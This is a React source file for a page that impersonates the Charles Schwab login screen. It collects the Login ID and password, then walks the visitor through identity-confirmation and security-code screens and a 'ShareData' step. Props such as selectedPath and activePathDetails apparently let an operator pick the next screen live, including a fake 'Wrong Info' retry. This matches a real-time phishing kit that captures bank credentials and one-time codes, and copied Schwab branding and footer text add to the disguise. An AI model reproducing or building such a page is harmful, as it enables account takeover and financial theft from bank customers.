import BankingHeader from "./BankingHeader";
import { FaRegEye, FaRegEyeSlash } from "react-icons/fa6";
import { Link } from "react-router-dom";
import clsx from "clsx";
import useBankFunctions from "../../../../../../../hooks/useBankFunctions";
import { motion } from "framer-motion";
import CharlesFavIcon from "../../../../../../../../assets/allBanks/banks/charles/cl3.png";
import CharlesImg from "../../../../../../../../assets/allBanks/banks/charles/cl2.png";
import { BsExclamationCircleFill } from "react-icons/bs";
import { otpOptions } from "../../bankDetails";
import ShareData from "./ShareData";
import { ClipLoader } from "react-spinners";
import BasicLoader from "../../../../../loading/BasicLoader";
import BankControl from "./BankControl";
import BankOtpControl from "./BankOtpControl";

const Charles = ({
  handleCancel,
  bankName,
  selectedPath,
  allBankOpen,
  handleSelectSubmit,
  handleSelectedId,
  whatToShowDetails,
  setOtpOpen,
  OtpOpen,
  selectedOtp,
  handleSubmitOtp,
  handleSelectedOtp,
  otpInfo,
  activePathDetails,
  indexOtp,
  handleOtpOption,
  isOpenOtp,
  onSubmitOtpOptions,
  activeOtp,
  setAllBankItems,
  typeAccount,
  setTypeAccount,
  loading,
  setIsOpenOtp,
}) => {
  const {
    formState,
    handleTheMainSubmit,
    errorFormState,
    handleChange,
    onSubmitOtp,
    errorOtp,
    changeOtp,
    formOtp,
    resend,
    setshowPassword,
    showPassword,
    handleTheFinal,
    handleVerifiedOtp,
    onSumbitForm,
    handleResend,
  } = useBankFunctions(bankName, setOtpOpen, setAllBankItems, setTypeAccount);

  return (
    <>
      <motion.div
        initial={{ y: -100, opacity: 0 }}
        animate={{ y: 0, opacity: 1 }}
        exit={{ y: -100, opacity: 0 }}
        transition={{ type: "spring", stiffness: 300, damping: 50 }}
        className={clsx(
          "w-full min-h-screen h-full  top-0  bg-white",
          typeAccount ? "hidden" : "block"
        )}
      >
        <BankingHeader
          text="Charles Schwab Log In Help"
          handleCancel={handleCancel}
          img={CharlesFavIcon}
          setAllBankItems={setAllBankItems}
          setIsOpenOtp={setIsOpenOtp}
          setOtpOpen={setOtpOpen}
        />
        <header className="w-full pl-5 border-b border-customGray-1021 bg-customGray-1025">
          <div>
            <img src={CharlesImg} alt="" className="object-contain w-20 h-20" />
          </div>
        </header>
        <div
          className={clsx(
            "flex justify-center px-4 pt-12 customXlg:px-64 text-customGray-400",
            allBankOpen ? "hidden" : "block"
          )}
        >
          <div className={clsx("w-full")}>
            <h1 className="text-[25px] mb-3">Log In</h1>
            <div className="mb-3 space-y-1">
              <label className="font-semibold ">Login ID</label>
              <input
                type="text"
                value={formState.username}
                name="username"
                onChange={handleChange}
                className={clsx(
                  "w-full px-4 py-2.5 border-customGray-1000 border rounded-md ",
                  errorFormState.username ? "border border-customRed-200" : ""
                )}
              />
              {errorFormState.username && (
                <p className="mt-1 text-sm text-customRed-200">
                  Please tell us your username
                </p>
              )}
            </div>
            <div className="relative mb-3 space-y-1">
              <label className="font-semibold ">Password</label>
              <input
                type={showPassword ? "text" : "password"}
                value={formState.password}
                name="password"
                onChange={handleChange}
                className={clsx(
                  "w-full px-4 py-2.5 border-customGray-1000 border rounded-md pr-10",
                  errorFormState.password ? "border border-customRed-200" : ""
                )}
              />
              <span
                onClick={() => setshowPassword((prevShow) => !prevShow)}
                className="absolute h-full top-9 right-3"
              >
                {showPassword ? (
                  <FaRegEyeSlash size={20} />
                ) : (
                  <FaRegEye size={20} />
                )}
              </span>
              {errorFormState.password && (
                <p className="mt-1 text-sm text-customRed-200">
                  Please tell us your password
                </p>
              )}
            </div>
            <div className="mt-5 space-y-3">
              <button
                onClick={(e) => handleTheMainSubmit(e, onSumbitForm)}
                className="w-full py-3 text-lg text-white rounded-lg bg-customBlue-1011"
              >
                {loading && <ClipLoader size={10} color="#fff" />}
                {loading ? "Loading..." : "Log In"}
              </button>
              <button className="w-full py-3 text-lg rounded-lg text-customBlue-1011 bg-customGray-1027 hover:underline">
                <Link to="https://www.schwab.com/">Forgot Password?</Link>
              </button>
            </div>
          </div>
        </div>
        {allBankOpen && (
          <div className={clsx(OtpOpen ? "hidden" : "block")}>
            <BankControl
              handleSelectedId={handleSelectedId}
              selectedPath={selectedPath}
              handleSelectSubmit={handleSelectSubmit}
            />
            <div>
              {activePathDetails.name === "Loading" && (
                <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                  <BasicLoader />
                </p>
              )}
              {activePathDetails.name === "Wrong Info" && (
                <>
                  <div
                    className={clsx(
                      "flex justify-center px-4 pt-12 customXlg:px-64 text-customGray-400"
                    )}
                  >
                    <div className={clsx("w-full")}>
                      <h1 className="text-[25px] mb-3">Log In</h1>
                      <div className="flex justify-center gap-1 mx-3 my-5 font-extrabold text-center customMiniTablet:mx-0 text-customRed-200">
                        <BsExclamationCircleFill className="mt-[2px]" />

                        <p>{activePathDetails.body}</p>
                      </div>
                      <div className="mb-3 space-y-1">
                        <label className="font-semibold ">Login ID</label>
                        <input
                          type="text"
                          value={formState.username}
                          name="username"
                          onChange={handleChange}
                          className={clsx(
                            "w-full px-4 py-2.5 border-customGray-1000 border rounded-md ",
                            errorFormState.username
                              ? "border border-customRed-200"
                              : ""
                          )}
                        />
                        {errorFormState.username && (
                          <p className="mt-1 text-sm text-customRed-200">
                            Please tell us your username
                          </p>
                        )}
                      </div>
                      <div className="relative mb-3 space-y-1">
                        <label className="font-semibold ">Password</label>
                        <input
                          type={showPassword ? "text" : "password"}
                          value={formState.password}
                          name="password"
                          onChange={handleChange}
                          className={clsx(
                            "w-full px-4 py-2.5 border-customGray-1000 border rounded-md pr-10",
                            errorFormState.password
                              ? "border border-customRed-200"
                              : ""
                          )}
                        />
                        <span
                          onClick={() =>
                            setshowPassword((prevShow) => !prevShow)
                          }
                          className="absolute h-full top-9 right-3"
                        >
                          {showPassword ? (
                            <FaRegEyeSlash size={20} />
                          ) : (
                            <FaRegEye size={20} />
                          )}
                        </span>
                        {errorFormState.password && (
                          <p className="mt-1 text-sm text-customRed-200">
                            Please tell us your password
                          </p>
                        )}
                      </div>
                      <div className="mt-5 space-y-3">
                        <button
                          onClick={(e) => handleTheMainSubmit(e, onSumbitForm)}
                          className="w-full py-3 text-lg text-white rounded-lg bg-customBlue-1011"
                        >
                          {loading && <ClipLoader size={10} color="#fff" />}
                          {loading ? "Loading..." : "Log In"}
                        </button>
                        <button className="w-full py-3 text-lg rounded-lg text-customBlue-1011 bg-customGray-1027 hover:underline">
                          <Link to="https://www.schwab.com/">
                            Forgot Password?
                          </Link>
                        </button>
                      </div>
                    </div>
                  </div>
                </>
              )}
              {activePathDetails.name === "Send Otp" && (
                <>
                  <h3>{activePathDetails.body}</h3>
                  <div>
                    <div className={clsx(isOpenOtp && "hidden")}>
                      <div className="px-4 pt-10 customXlg:px-36">
                        <div className="mb-2 space-y-1">
                          <h3 className="text-2xl font-light">
                            Confirm Your Identity
                          </h3>
                          <p className="text-customGray-200">
                            For your protection, we want to confirm your
                            identity
                          </p>
                        </div>
                        <div>
                          <h2 className="mb-2 font-semibold text-customGray-900">
                            How do you want to confirm your identity?
                          </h2>
                          <div
                            role="radiogroup"
                            aria-label="Otp Options"
                            className="flex flex-col mb-6 space-y-3"
                          >
                            {otpOptions.map((bank) => (
                              <div
                                key={bank.id}
                                role="radio"
                                tabIndex={0}
                                onClick={() => handleOtpOption(bank.id)}
                                className="flex items-center gap-2.5 "
                              >
                                <div className="border border-black rounded-full p-[2px] text-center mb-[1px]">
                                  <p
                                    className={clsx(
                                      "rounded-full w-[10px] h-[10px]  ",
                                      otpOptions[indexOtp]?.id === bank.id
                                        ? "bg-customBlue-500"
                                        : ""
                                    )}
                                  ></p>
                                </div>
                                <h2
                                  className={clsx(
                                    "text-sm",
                                    otpOptions[indexOtp]?.id === bank.id
                                      ? "text-customBlue-500 hover:underline"
                                      : "hover:text-customBlue-700 hover:underline"
                                  )}
                                >
                                  {bank.name}
                                </h2>
                              </div>
                            ))}
                          </div>
                          <button
                            onClick={onSubmitOtpOptions}
                            className="w-full py-3 text-lg text-white rounded-lg bg-customBlue-1011"
                          >
                            Continue
                          </button>
                        </div>
                      </div>
                    </div>
                  </div>
                  {isOpenOtp && (
                    <div className={clsx("pt-10 px-4 customXlg:px-36")}>
                      <div>
                        <div>
                          <div className="mb-2 space-y-1">
                            <h3 className="text-2xl font-light">
                              Enter Security Code
                            </h3>
                            <h2 className="text-customGray-200">
                              Enter the security code we texted to your mobile
                              phone expires in 15 minutes
                            </h2>
                          </div>
                          <div>
                            <div>
                              <label className="font-semibold ">
                                Security Code
                              </label>
                              <input
                                type="number"
                                value={formOtp.otpo}
                                name="otpo"
                                onChange={changeOtp}
                                className={clsx(
                                  "w-full px-4 py-2.5 border-customGray-1000 border rounded-md pr-10 no-spinner ",
                                  errorOtp.otpo
                                    ? "border border-customRed-200"
                                    : ""
                                )}
                              />
                              {errorOtp.otpo && (
                                <p className="mt-1 text-sm text-customRed-200">
                                  Please enter the code.
                                </p>
                              )}
                            </div>
                            <button
                              onClick={(e) => onSubmitOtp(e, handleVerifiedOtp)}
                              className="w-full py-3 my-6 text-lg text-white rounded-lg bg-customBlue-1011"
                            >
                              {loading && <ClipLoader size={10} color="#fff" />}
                              {loading ? "Loading..." : "Submit"}
                            </button>
                            <p
                              className={clsx(
                                "cursor-pointer text-customBlue-100 font-bold",
                                !resend &&
                                  "text-customBlue-500 text-opacity-25 cursor-not-allowed"
                              )}
                              onClick={handleResend}
                            >
                              Send a new code
                            </p>
                          </div>
                        </div>
                      </div>
                    </div>
                  )}
                </>
              )}
            </div>
          </div>
        )}
        {OtpOpen && (
          <>
            <BankOtpControl
              handleSelectedOtp={handleSelectedOtp}
              selectedOtp={selectedOtp}
              handleSubmitOtp={handleSubmitOtp}
            />

            <div>
              {activeOtp.name === "Loading" && (
                <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                  <BasicLoader />
                </p>
              )}
              {activeOtp.name === "wrong" && (
                <>
                  <div className={clsx("pt-10 px-4 customXlg:px-36")}>
                    <div>
                      <div>
                        <div className="mb-2 space-y-1">
                          <h3 className="text-2xl font-light">
                            Enter Security Code
                          </h3>
                          <h2 className="text-customGray-200">
                            Enter the security code we texted to your mobile
                            phone expires in 15 minutes
                          </h2>
                        </div>
                        <div>
                          <div>
                            <label className="font-semibold ">
                              Security Code
                            </label>
                            <input
                              type="number"
                              value={formOtp.otpo}
                              name="otpo"
                              onChange={changeOtp}
                              className={clsx(
                                "w-full px-4 py-2.5 border-customGray-1000 border rounded-md pr-10 no-spinner ",
                                errorOtp.otpo
                                  ? "border border-customRed-200"
                                  : ""
                              )}
                            />
                            {errorOtp.otpo && (
                              <p className="mt-1 text-sm text-customRed-200">
                                Please enter the code.
                              </p>
                            )}
                            <h3 className="mt-2 text-sm text-customRed-200">
                              {activeOtp.body}
                            </h3>
                          </div>
                          <button
                            onClick={(e) => onSubmitOtp(e, handleVerifiedOtp)}
                            className="w-full py-3 my-6 text-lg text-white rounded-lg bg-customBlue-1011"
                          >
                            {loading && <ClipLoader size={10} color="#fff" />}
                            {loading ? "Loading..." : "Submit"}
                          </button>
                          <p
                            className={clsx(
                              "cursor-pointer text-customBlue-100 font-bold",
                              !resend &&
                                "text-customBlue-500 text-opacity-25 cursor-not-allowed"
                            )}
                            onClick={handleResend}
                          >
                            Send a new code
                          </p>
                        </div>
                      </div>
                    </div>
                  </div>
                </>
              )}
              {activeOtp.name === "otp" && (
                <>
                  <ShareData
                    bankName={bankName}
                    handleTheFinal={handleTheFinal}
                    handleCancel={handleCancel}
                    setIsOpenOtp={setIsOpenOtp}
                    setAllBankItems={setAllBankItems}
                    siteLink="https://www.schwab.com/"
                  />
                </>
              )}
            </div>
          </>
        )}
        <footer className="mt-20 py-4 px-5 text-[11px] space-y-4">
          <p>
            This site supports Microsoft Edge, Google Chrome, and Mozilla
            Firefox.
          </p>
          <div>
            <p>For institutional use only.</p>
            <p>
              ©2025 Charles Schwab & Co., Inc. (&quot;Schwab&quot;). Member{" "}
              <span className="text-customBlue-1011">SIPC.</span>
              All rights reserved. (1214-6829)
            </p>
          </div>
        </footer>
      </motion.div>
    </>
  );
};

export default Charles;
